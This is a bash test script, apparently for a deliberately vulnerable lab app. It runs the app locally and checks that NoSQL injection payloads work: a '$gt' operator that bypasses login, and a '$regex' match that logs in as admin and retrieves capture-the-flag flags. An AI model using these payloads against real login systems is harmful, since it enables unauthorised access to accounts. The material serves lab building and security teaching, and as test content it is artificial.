#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

echo "[*] Waiting for app on port 8085..."
for i in $(seq 1 30); do
    nc -z -w2 127.0.0.1 8085 2>/dev/null && break
    sleep 2
done
sleep 3

# Test 1: homepage responds
check "homepage responds" "$(curl -sf http://127.0.0.1:8085/ >/dev/null 2>&1 && echo 1 || echo 0)"

# Test 2: normal login works
CODE=$(curl -s -c /tmp/nosql_cookies_$$.txt -o /dev/null -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"hunter2"}' \
    http://127.0.0.1:8085/login 2>/dev/null)
check "normal login succeeds" "$([ "$CODE" = "200" ] && echo 1 || echo 0)"

# Test 3: dashboard returns flag1
OUT=$(curl -sf -b /tmp/nosql_cookies_$$.txt http://127.0.0.1:8085/dashboard 2>/dev/null)
FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "dashboard returns flag1 for authenticated user" "$([ -n "$FLAG1" ] && echo 1 || echo 0)"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 4: NoSQL injection with $gt bypasses login
rm -f /tmp/nosql_inject_$$.txt
CODE=$(curl -s -c /tmp/nosql_inject_$$.txt -o /tmp/nosql_resp_$$.txt -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d '{"username":{"$gt":""},"password":{"$gt":""}}' \
    http://127.0.0.1:8085/login 2>/dev/null)
check "NoSQL \$gt injection bypasses login" "$([ "$CODE" = "200" ] && echo 1 || echo 0)"

# Test 5: regex injection logs in as admin
rm -f /tmp/nosql_admin_$$.txt
CODE=$(curl -s -c /tmp/nosql_admin_$$.txt -o /tmp/nosql_admin_resp_$$.txt -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d '{"username":{"$regex":"^admin$"},"password":{"$gt":""}}' \
    http://127.0.0.1:8085/login 2>/dev/null)
check "NoSQL \$regex injection logs in as admin" "$([ "$CODE" = "200" ] && echo 1 || echo 0)"

# Test 6: /admin returns flag2
OUT=$(curl -sf -b /tmp/nosql_admin_$$.txt http://127.0.0.1:8085/admin 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "/admin returns flag2 after admin login" "$([ -n "$FLAG2" ] && echo 1 || echo 0)"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

rm -f /tmp/nosql_cookies_$$.txt /tmp/nosql_inject_$$.txt /tmp/nosql_resp_$$.txt \
       /tmp/nosql_admin_$$.txt /tmp/nosql_admin_resp_$$.txt
$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
